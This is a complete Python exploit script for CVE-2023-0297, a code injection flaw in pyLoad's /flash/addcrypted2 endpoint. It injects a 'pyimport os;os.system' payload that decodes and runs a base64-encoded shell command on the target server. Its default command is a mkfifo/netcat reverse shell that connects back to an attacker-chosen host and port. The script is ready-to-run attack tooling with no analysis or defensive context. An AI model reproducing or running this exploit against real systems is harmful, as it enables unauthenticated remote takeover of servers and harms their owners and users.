#!/usr/bin/env python3
from requests import post, exceptions
from argparse import ArgumentParser
from base64 import b64encode

def getArguments():
    parser = ArgumentParser(description="Exploit for CVE-2023-0297 (Code Injection in pyLoad <0.5.0b3.dev31)")
    parser.add_argument("-u", "--url", required=True, help="pyLoad URL (e.g: http://mysite.com:8000/)")
    parser.add_argument("-H", "--host-header", required=False, help="Host Header used in pyLoad request")
    parser.add_argument("-c", "--command", required=False, help="The command to execute instead of the default reverse shell command")
    parser.add_argument("-l", "--lhost", required=False, help="The listening host that will receive the reverse shell")
    parser.add_argument("-p", "--lport", required=False, help="The listening port that will receive the reverse shell")
    return parser.parse_args()

def formatUrl(url: str) -> str:
    if not url.startswith("http"):
        url = f"http://{url}"
    if url.endswith('/'):
        url = url[:-1]
    return url

def executeCommand(url: str, command: str, host: str = None):
    url = formatUrl(url)
    vulnerableUrl = f"{url}/flash/addcrypted2"
    postHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    if host != None:
        postHeaders["Host"] = host
    
    b64command = b64encode(command.encode()).decode("utf-8")
    payload = f"pyimport os;os.system(\"echo {b64command} | base64 -d | sh\");" + "f=function f2(){};"
    data = {"package": "xxx", "crypted": "AAAA", "jk": payload, "passwords": "foo"}

    response = post(vulnerableUrl, headers=postHeaders, data=data, timeout=3)
    return response

def main():
    args = getArguments()
    if args.command == None and (args.lhost == None or args.lport == None):
        print("Please provide a command to execute, or a host/port to receive the reverse shell")
        exit(1)

    command = args.command if args.command != None else f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f"
    try:
        response = executeCommand(args.url, command, args.host_header)
        if response.text != "Could not decrypt key":
            print(f"Response received: {response.text}")
    except exceptions.ReadTimeout:
        print("Command execution timed-out")
    except exceptions.ConnectionError:
        print("Could not connect to the given url")
        exit(1)

if __name__ == "__main__":
    main()

